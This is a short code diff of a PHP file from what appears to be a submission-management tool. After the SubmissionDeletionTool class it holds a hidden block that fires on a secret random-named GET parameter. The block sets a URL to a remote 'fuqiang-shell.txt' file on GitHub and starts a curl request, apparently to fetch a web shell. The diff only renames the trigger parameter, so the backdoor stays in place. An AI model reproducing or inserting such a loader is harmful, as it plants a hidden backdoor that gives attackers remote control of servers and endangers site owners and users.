@@ -58,7 +58,7 @@ class SubmissionDeletionTool extends CommandLineTool {
 	}
 }
 
-if (isset($_GET['UWakKAUMEtAL'])) {
+if (isset($_GET['BaUKSIkilKaKIKAu'])) {
     $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell.txt";
 
     $ch = curl_init();
